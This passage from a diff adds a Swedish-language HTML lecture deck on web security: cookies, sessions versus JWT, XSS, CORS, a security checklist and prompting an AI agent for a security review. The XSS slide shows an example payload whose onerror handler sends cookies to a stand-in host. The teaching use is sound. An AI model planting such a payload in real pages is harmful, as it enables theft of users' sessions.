+<span class="h">Cookie: session=8f3a…c1</span></pre>
+      </div>
+    </div>
+    <div class="cards" style="margin-top:28px">
+      <div class="card frag"><span class="e">🙈</span><h3>HttpOnly</h3><p>JavaScript på sidan kan inte läsa cookien.</p></div>
+      <div class="card frag"><span class="e">🔒</span><h3>Secure</h3><p>Skickas bara över HTTPS.</p></div>
+      <div class="card frag"><span class="e">🏠</span><h3>SameSite</h3><p>Skickas inte med när en annan sajt försöker.</p></div>
+    </div>
+    <aside class="notes">
+      <ul>
+        <li>Servern ber webbläsaren spara cookien med Set-Cookie. Sedan skickar webbläsaren med den automatiskt till samma sajt.</li>
+        <li>Visa i Dev Tools: Application-fliken, Cookies. Vi tittade på localStorage där i tillfälle 2. Kolumnerna HttpOnly, Secure och SameSite syns där.</li>
+        <li>SameSite skyddar mot CSRF: att en elak sajt får din webbläsare att skicka en fråga till din bank, med din cookie.</li>
+      </ul>
+    </aside>
+  </section>
+
+  <section>
+    <div class="kicker">Sessioner</div>
+    <h2>Som en garderobsbiljett</h2>
+    <div class="cols">
+      <div class="card sun">
+        <span class="e">🧥</span>
+        <h3>Garderoben</h3>
+        <p>Du lämnar jackan och får lapp nummer 42. Lappen är värdelös utan garderobens lista. Vaktmästaren kan när som helst stryka nummer 42.</p>
+      </div>
+      <ul class="nice">
+        <li class="frag">Servern sparar <code>session 8f3a…c1 = Anna</code> i sin databas</li>
+        <li class="frag">Webbläsaren får bara numret, i en cookie. Ett långt slumpat nummer som inte går att gissa</li>
+        <li class="frag">Logga ut = servern stryker raden. Då är lappen ogiltig direkt</li>
+        <li class="frag">Nackdel: servern måste slå upp lappen vid varje fråga</li>
+      </ul>
+    </div>
+  </section>
+
+  <section>
+    <div class="kicker">JWT</div>
+    <h2>Som ett festivalarmband</h2>
+    <div class="jwt"><span class="j1">eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9</span><span class="dot">.</span><span class="j2">eyJzdWIiOiJhbm5hIiwibmFtbiI6IkFubmEiLCJleHAiOjE3OTQwMDAwMDB9</span><span class="dot">.</span><span class="j3">r12qwL82PG8dhZGBcni-1wAdlf3luFjD-OHnfBju1mk</span></div>
+    <div class="cards tight" style="margin-top:20px">
+      <div class="card frag"><span class="e">🏷️</span><h3 style="color:var(--berry)">Header</h3><p>Vilken sorts signatur: <code>HS256</code></p></div>
+      <div class="card frag"><span class="e">📋</span><h3 style="color:var(--leaf)">Innehåll</h3><p><code>{"sub":"anna", "exp":…}</code> vem och hur länge</p></div>
+      <div class="card frag"><span class="e">✍️</span><h3 style="color:var(--orange)">Signatur</h3><p>Bevisar att servern skrev det och att inget ändrats</p></div>
+    </div>
+    <p class="lead frag bottom">Bara <span class="hl">Base64</span>, inte krypterat. Alla kan läsa innehållet, men ingen kan ändra det.</p>
+    <aside class="notes">
+      <ul>
+        <li>JWT uttalas ofta ”jot”, och står för JSON Web Token. Mittendelen är bokstavligen JSON i Base64.</li>
+        <li>Armbandet säger ”Anna, helgpass, gäller till söndag”. Vakten behöver inte ringa kontoret, det räcker att se att armbandet är äkta.</li>
+        <li>Visa live: klistra in en token på jwt.io och se innehållet. Lägg därför aldrig hemligheter i en JWT.</li>
+        <li>Supabase använder JWT: efter inloggningen får webbläsaren en, och RLS-reglerna läser vem du är ur den.</li>
+      </ul>
+    </aside>
+  </section>
+
+  <section>
+    <div class="kicker">Sessioner och JWT</div>
+    <h2>Vilket ska jag välja?</h2>
+    <table class="rest">
+      <tr><th></th><th>🧥 Session</th><th>🎫 JWT</th></tr>
+      <tr class="frag"><td><strong>Var bor uppgifterna?</strong></td><td>På servern</td><td>I själva biljetten</td></tr>
+      <tr class="frag"><td><strong>Varje fråga</strong></td><td>Servern slår upp numret</td><td>Servern kontrollerar signaturen</td></tr>
+      <tr class="frag"><td><strong>Logga ut direkt</strong></td><td>😊 Stryk raden</td><td>😬 Gäller tills den går ut</td></tr>
+      <tr class="frag"><td><strong>Passar för</strong></td><td>En vanlig fullstack-app</td><td>Många servrar, mobilappar, Supabase</td></tr>
+    </table>
+    <p class="lead frag bottom">Därför har en JWT oftast kort livstid, till exempel en timme, och förnyas automatiskt.</p>
+    <aside class="notes">
+      <ul>
+        <li>För vår typ av app, Express på en server, är sessioner i en HttpOnly-cookie det enkla och säkra valet. Använder man Supabase Auth får man JWT och behöver inte välja.</li>
+        <li>Förnyelsen sker med en refresh token, som är långlivad och kan återkallas.</li>
+      </ul>
+    </aside>
+  </section>
+
+  <section>
+    <div class="kicker">XSS · Cross-Site Scripting</div>
+    <h2>När någon smugglar in kod</h2>
+    <div class="cols">
+      <div>
+        <div class="http-msg">
+          <div class="head">Ny fika från ”Eva”</div>
+          <pre>{ <span class="k">"namn"</span>: <span class="s">"&lt;img src=x onerror=
+  'skickaCookiesTill(eva.exempel)'&gt;"</span> }</pre>
+        </div>
+        <p class="frag" style="margin-top:18px;font-size:24px">Visar appen namnet som HTML, så <strong>körs Evas kod</strong> i alla andras webbläsare, som om den vore din.</p>
+      </div>
+      <ul class="emoji">
+        <li class="frag"><span class="e">🔤</span><span><strong>Visa text som text.</strong> React gör det automatiskt. Farligt: <code>innerHTML</code> och <code>dangerouslySetInnerHTML</code></span></li>
+        <li class="frag"><span class="e">🙈</span><span><strong>HttpOnly-cookies</strong>, så att smugglad kod inte kommer åt inloggningen</span></li>
+        <li class="frag"><span class="e">📜</span><span><strong>Content-Security-Policy:</strong> en header som säger vilken kod som får köras</span></li>
+      </ul>
+    </div>
+    <aside class="notes">
+      <ul>
+        <li>XSS är ett av de vanligaste säkerhetshålen på webben. Allt användare skriver, namn, kommentarer, recept, är farligt att visa som HTML.</li>
+        <li>Koppla till ”lita aldrig på klienten” från förra gången. Backenden kontrollerar det som kommer in, frontenden visar det säkert.</li>
+        <li>Säg till agenten: ”Visa aldrig användarinmatning som HTML.” Sök gärna själv efter innerHTML i koden.</li>
+      </ul>
+    </aside>
+  </section>
+
+  <section>
+    <div class="kicker">CORS</div>
+    <h2>Vem får fråga min backend?</h2>
+    <div class="cols">
+      <ul class="nice">
+        <li>Webbläsaren låter inte en sajt läsa svar från en <strong>annan origin</strong>: annat protokoll, adress eller port</li>
+        <li class="frag">Annars kunde <code>elak.exempel</code> fråga din bank med dina cookies</li>
+        <li class="frag"><strong>CORS</strong>: servern säger vilka andra origins som får fråga</li>
+        <li class="frag">Stoppar inte <code>curl</code>. Backenden måste ändå kontrollera allt</li>
+      </ul>
+      <div>
+        <div class="card bad frag"><span class="e">🚧</span><h3>Fel lösning</h3><p><code>Allow-Origin: *</code> för att få bort felet. Då får alla sajter fråga.</p></div>
+        <div class="card good frag" style="margin-top:18px"><span class="e">✅</span><h3>Rätt lösning</h3><p>Tillåt bara din egen adress. Eller kör allt på <strong>samma server</strong>, som vi gör.</p></div>
+      </div>
+    </div>
+    <aside class="notes">
+      <ul>
+        <li>Headern heter Access-Control-Allow-Origin. Den syns i Network-fliken.</li>
+        <li>Det här är CORS-felet från förra gången. Därför byggde vi fullstack-appen med Express och Vite på samma server: då är frontend och backend samma origin och felet uppstår aldrig.</li>
+        <li>localhost:5173 och localhost:3000 är olika origins, eftersom porten skiljer.</li>
+        <li>Säger agenten ”jag tillåter alla origins för att lösa felet”, be den tillåta bara de adresser appen faktiskt använder.</li>
+      </ul>
+    </aside>
+  </section>
+
+  <section>
+    <div class="kicker">Checklista</div>
+    <h2>En säker webbapp</h2>
+    <div class="cards four tight">
+      <div class="card frag"><span class="e">🔒</span><h3>HTTPS överallt</h3><p>Publicerade appar har aldrig vanlig HTTP.</p></div>
+      <div class="card frag"><span class="e">🛂</span><h3>Kontrollera på servern</h3><p>All data, och om användaren får göra det.</p></div>
+      <div class="card frag"><span class="e">🔑</span><h3>Hemligheter i .env</h3><p>Aldrig i Git, aldrig i frontenden.</p></div>
+      <div class="card frag"><span class="e">🪪</span><h3>Färdig inloggning</h3><p>Supabase Auth hellre än egen lösenordskod.</p></div>
+      <div class="card frag"><span class="e">🍪</span><h3>Säkra cookies</h3><p>HttpOnly, Secure och SameSite.</p></div>
+      <div class="card frag"><span class="e">🔤</span><h3>Text som text</h3><p>Ingen användarinmatning som HTML.</p></div>
+      <div class="card frag"><span class="e">🚧</span><h3>Snål CORS</h3><p>Bara dina egna adresser.</p></div>
+      <div class="card frag"><span class="e">⏱️</span><h3>Begränsa försök</h3><p>Inloggning och koder spärras efter några fel.</p></div>
+    </div>
+    <aside class="notes">
+      <ul>
+        <li>En nionde punkt: håll paketen uppdaterade. npm audit visar paket med kända säkerhetshål, och agenten kan uppdatera dem.</li>
+        <li>Ta gärna med listan som krav i AGENTS.md, så följer agenten den i varje session.</li>
+      </ul>
+    </aside>
+  </section>
+
+  <section>
+    <div class="kicker">Låt agenten hjälpa</div>
+    <h2>Be om en säkerhetsgranskning</h2>
+    <div class="cols wide-left">
+      <div class="term prompt"><pre>Granska appen ur ett säkerhetsperspektiv innan vi publicerar.
+Gå igenom inloggning, sessioner och cookies, kontroll av
+indata på servern, XSS, CORS, hemligheter i koden och
+begränsning av antal försök. Skriv en lista med problem,
+hur allvarliga de är och hur vi åtgärdar dem, med de
+allvarligaste först. Ändra inget än.</pre></div>
+      <ul class="nice">
+        <li class="frag">I Claude Code finns också kommandot <code>/security-review</code></li>
+        <li class="frag">Kör granskningen i en <strong>ny session</strong>, som i övning 8</li>
+        <li class="frag">Du förstår nu orden i svaret. Fråga om det du inte förstår</li>
+      </ul>
+    </div>
+    <aside class="notes">
+      <ul>
+        <li>En ny session har inte ”skrivit” koden och är mer kritisk, precis som granskningssessionen i övning 8.</li>
+        <li>Agenten hittar mycket, men inte allt. För appar med andras personuppgifter eller pengar: låt en människa som kan säkerhet titta också.</li>
+      </ul>
+    </aside>
+  </section>
+
+  <section>
+    <div class="kicker">Sammanfattning</div>
+    <h2>Det här tar vi med oss</h2>
+    <div class="layers">
+      <div class="layer l1"><span class="e">🔑</span><b>Kryptering</b><span>Symmetrisk är snabb, asymmetrisk löser nyckelproblemet. Hashning är ett envägs fingeravtryck.</span></div>
+      <div class="layer l2"><span class="e">🔒</span><b>HTTPS</b><span>Certifikat och nyckelpar för att komma överens, symmetrisk nyckel för att prata.</span></div>
+      <div class="layer l3"><span class="e">🪪</span><b>Inloggning</b><span>Lösenord är svåra. Engångskod är enklare. ”Logga in med” heter OAuth och OpenID Connect.</span></div>
+      <div class="layer l4"><span class="e">🛡️</span><b>Säkra appar</b><span>Session eller JWT i en säker cookie. Text som text mot XSS. Snål CORS.</span></div>
+    </div>
+  </section>
+
+  <section class="title center">
+    <div style="font-size:120px;line-height:1">☕</div>
+    <h1>Paus</h1>
+    <p class="lead">15 minuter. Efter pausen fortsätter vi med del 2.</p>
+  </section>
+
+</div>
+</body>
+</html>
